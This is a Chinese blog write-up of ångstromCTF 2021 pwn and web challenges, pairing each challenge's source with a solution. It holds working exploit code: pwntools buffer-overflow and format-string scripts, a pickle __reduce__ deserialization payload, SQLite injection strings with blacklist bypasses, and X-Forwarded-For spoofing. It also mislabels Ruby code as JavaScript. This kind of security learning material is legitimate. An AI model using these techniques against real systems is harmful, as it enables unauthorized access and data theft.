title: ångstromCTF 2021--wp与复现记
categories: [CTF]
tags: [wp,web,pwn]

---

记着自己去年刚接触国外的ctf比赛入门时,第一个接触的国外ctf比赛就是ångstromCTF。但当时我web方向做了很多，但今年却一道题都没有做出来（虽然其他方向做了写）。但也应该反省下《关于年过后我发现一年前的我比现在NB这件事》了。<!--more-->

## PWN

### tranquil

题目友好给了源码（第一次做外国ctf pwn都这么友好M?）

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int win(){
    char flag[128];
    
    FILE *file = fopen("flag.txt","r");
    
    if (!file) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }
    
    fgets(flag, 128, file);
    
    puts(flag);
}





int vuln(){
    char password[64];
    
    puts("Enter the secret word: ");
    
    gets(&password);
    
    
    if(strcmp(password, "password123") == 0){
        puts("Logged in! The flag is somewhere else though...");
    } else {
        puts("Login failed!");
    }
    
    return 0;
}


int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();
    
    // not so easy for you!
    // win();
    
    return 0;
}


```

经过审计发现题目给了后面函数win()，我们只要bypass `strcmp`函数即可利用栈溢出来调用win()

由于`strcmp`函数只判断到`\x00`截止，我们可以利用`password123%00`来bypass。

exp：

```python
from pwn import *

e=ELF('./tranquil')
p=remote('shell.actf.co',21830)
#process('./tranquil')

pay='password123'+(0x40-len('password123'))*'a'+p64(0)+p64(e.symbols['win'])

p.sendline(pay)
p.interactive()

```



### Sanity Checks

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    char password[64];
    int ways_to_leave_your_lover = 0;
    int what_i_cant_drive = 0;
    int when_im_walking_out_on_center_circle = 0;
    int which_highway_to_take_my_telephones_to = 0;
    int when_i_learned_the_truth = 0;
    
    printf("Enter the secret word: ");
    
    gets(&password);
    
    if(strcmp(password, "password123") == 0){
        puts("Logged in! Let's just do some quick checks to make sure everything's in order...");
        if (ways_to_leave_your_lover == 50) {
            if (what_i_cant_drive == 55) {
                if (when_im_walking_out_on_center_circle == 245) {
                    if (which_highway_to_take_my_telephones_to == 61) {
                        if (when_i_learned_the_truth == 17) {
                            char flag[128];
                            
                            FILE *f = fopen("flag.txt","r");
                            
                            if (!f) {
                                printf("Missing flag.txt. Contact an admin if you see this on remote.");
                                exit(1);
                            }
                            
                            fgets(flag, 128, f);
                            
                            printf(flag);
                            return;
                        }
                    }
                }
            }
        }
        puts("Nope, something seems off.");
    } else {
        puts("Login failed!");
    }
}
```

在上一题的基层上，增加了对4个变量的判断，打开ida发现要判断的4个变量在栈末位，每个占有2个字节于是合理推算栈空间。

exp：

```python
from pwn import *

p=remote('shell.actf.co',21303)
#process('./checks')
e=ELF('./checks')
pay='password123\00'+(0x60-len('password123\00')-0x14)*'a'+p32(0x11)+p32(0x3d)+p32(0xf5)+p32(0x37)+p32(0x32)
print len(p32(0x11)+p32(0x3d)+p32(0xf5)+p32(0x37)+p32(0x32))
#gdb.attach(p)
p.sendline(pay)


p.interactive()
```



### stickystacks

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


typedef struct Secrets {
    char secret1[50];
    char password[50];
    char birthday[50];
    char ssn[50];
    char flag[128];
} Secrets;


int vuln(){
    char name[7];
    
    Secrets boshsecrets = {
        .secret1 = "CTFs are fun!",
        .password= "password123",
        .birthday = "1/1/1970",
        .ssn = "123-456-7890",
    };
    
    
    FILE *f = fopen("flag.txt","r");
    if (!f) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }
    fgets(&(boshsecrets.flag), 128, f);
    
    
    puts("Name: ");
    
    fgets(name, 6, stdin);
    
    
    printf("Welcome, ");
    printf(name);
    printf("\n");
    
    return 0;
}


int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();
    
    return 0;
}
```

观察代码发现`printf(name);`有格式化字符串漏洞。利用次来找flag。

exp：

```python
from pwn import *

#e=ELF('stickystacks')
p=remote('shell.actf.co',21820)
#process('stickystacks')
#gdb.attach(p)
p.sendline('%42$p')
p.interactive()
```



## WEB

### Jar（复现）

题目给了源码：

```python
from flask import Flask, send_file, request, make_response, redirect
import random
import os

app = Flask(__name__)

import pickle
import base64

flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')

@app.route('/pickle.jpg')
def bg():
	return send_file('pickle.jpg')

@app.route('/')
def jar():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	return '<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg">' + \
		''.join(f'<div style="background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;">{item}</div>' for item in items)

@app.route('/add', methods=['POST'])
def add():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	items.append(request.form['item'])
	response = make_response(redirect('/'))
	response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
	return response

app.run(threaded=True, host="0.0.0.0")
```

通过审计可以发现`import pickle`，因此可以揣摩是python的反序列化。临时，找了一篇文章：

https://www.freebuf.com/articles/web/252189.html

来学习了解python里的反序列化利用。

但自己在做题时踩一个坑：

`	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []`

`items=[]`代表返回值为NULL但是`items`的类型应该还是为`list`因此我们在构筑payload时应该让其`pickle.loads`后的类型为`list`。

写个脚本构造exp：

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.getenv, ('FLAG',))

pickled = pickle.dumps([RCE()])#注意是个list类型
print(base64.b64encode(pickled).decode()) 
```

得到payload转包篡改cookie。

![image-20210411143557147](image-20210411143557147.png)

得到flag：

![image-20210411143808124](image-20210411143808124.png)

最后提下，os.getenv可以获得环境变量里的参数。

![image-20210411143857541](image-20210411143857541.png)



### Sea of Quills（复现）

这题也给了源码：

```js
require 'sinatra'
require 'sqlite3'

set :bind, "0.0.0.0"
set :port, 4567

get '/' do
	db = SQLite3::Database.new "quills.db"
	@row = db.execute( "select * from quills" )
	

	erb :index
end

get '/quills' do
	erb :quills	

end


post '/quills' do
	db = SQLite3::Database.new "quills.db"
	cols = params[:cols]
	lim = params[:limit]
	off = params[:offset]
	
	blacklist = ["-", "/", ";", "'", "\""]
	
	blacklist.each { |word|
		if cols.include? word
			return "beep boop sqli detected!"
		end
	}

	
	if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
		return "bad, no quills for you!"
	end

	@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])

	p @row

	erb :specific
end

```

经过查阅发现是js写的sql查询，其中在'/quills'处没有对我们输入的cols参数进行过滤。

但做题时，还是技差一筹，百度了`sqlite3`是js操控Sql一种库，但忘了深入了解SQLite 跟MYSQL一样是一种数据库软件。(默认当sql来做然后原地卒.....)

于是经过查询查阅资料发现：

> SQLite数据库中有一个内置表，名为SQLITE_MASTER，此表中存储着当前数据库中所有表的相关信息，比如表的名称、用于创建此表的sql语句、索引、索引所属的表、创建索引的sql语句等。每一个 SQLite 数据库都有一个叫 SQLITE_MASTER 的表， 它定义数据库的模式。 
>
> SQLITE_MASTER的表结构：
>
> CREATE TABLE sqlite_master ( 
>
> type TEXT, 
>
> name TEXT, 
>
> tbl_name TEXT, 
>
> rootpage INTEGER, 
>
> sql TEXT );
> 原文链接：https://blog.csdn.net/qq_32572085/article/details/91407057

因此我们可以构造payload：

`cols=sql from sqlite_master union all select desc`

来看数据库中所有表的信息。

![image-20210411153853754](image-20210411153853754.png)

发现`CREATE TABLE flagtable (flag varchar(30))` 于是查询flagtable。

![image-20210411154011337](image-20210411154011337.png)



### Sea of Quills（复现）

这题较上一题多增加了限制：

```js
require 'sinatra'
require 'sqlite3'

set :server, :puma
set :bind, "0.0.0.0"
set :port, 4567
set :environment, :production

get '/' do
	db = SQLite3::Database.new "quills.db"
	@row = db.execute( "select * from quills" )
	

	erb :index
end

get '/quills' do
	erb :quills	

end


post '/quills' do
	db = SQLite3::Database.new "quills.db"
	cols = params[:cols]
	lim = params[:limit]
	off = params[:offset]
	
	blacklist = ["-", "/", ";", "'", "\"", "flag"]
	
	blacklist.each { |word|
		if cols.include? word
			return "beep boop sqli detected!"
		end
	}

	
	if cols.length > 24 || !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
		return "bad, no quills for you!"
	end

	@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])

	p @row

	erb :specific
end

```

限制了`flag`字符的出现和cols的长度。

但经过参考lao的wp发现：

大小写可以绕过flag检测，%00有类似mysql中`#`的作用。

参考网址：https://ctftime.org/task/15344

于是构造payload：`cols=* from Flagtable%00`

![image-20210411160349101](image-20210411160349101.png)

### Spoofy（复现）

题目源码：

```python
from flask import Flask, Response, request
import os
from typing import List

FLAG: str = os.environ.get("FLAG") or "flag{fake_flag}"
with open(__file__, "r") as f:
    SOURCE: str = f.read()

app: Flask = Flask(__name__)


def text_response(body: str, status: int = 200, **kwargs) -> Response:
    return Response(body, mimetype="text/plain", status=status, **kwargs)


@app.route("/source")
def send_source() -> Response:
    return text_response(SOURCE)


@app.route("/")
def main_page() -> Response:
    if "X-Forwarded-For" in request.headers:
        # https://stackoverflow.com/q/18264304/
        # Some people say first ip in list, some people say last
        # I don't know who to believe
        # So just believe both
        ips: List[str] = request.headers["X-Forwarded-For"].split(", ")
        if not ips:
            return text_response("How is it even possible to have 0 IPs???", 400)
        if ips[0] != ips[-1]:
            return text_response(
                "First and last IPs disagree so I'm just going to not serve this request.",
                400,
            )
        ip: str = ips[0]
        if ip != "1.3.3.7":
            return text_response("I don't trust you >:(", 401)
        return text_response("Hello 1337 haxx0r, here's the flag! " + FLAG)
    else:
        return text_response("Please run the server through a proxy.", 400)
```

根据审阅代码及提示,发现是X-Forwarded-For伪造.但是题目对"X-Forwarded-For"每一个参数都进行了处理我们单纯改会抱错.来自https://stackoverflow.com/questions/18264304/get-clients-real-ip-address-on-heroku所提到,我们手改X-Forwarded-For头包里依然会加上我们的正式地址.

![image-20210412154952876](image-20210412154952876.png)

因此我们可以利用不同中间件处理http策略不同的特性.构造两个X-Forwarded-For:

```
X-Forwarded-For:1.3.3.7
X-Forwarded-For: 1.1.1.1, 1.3.3.7
```

从而绕过得到flag。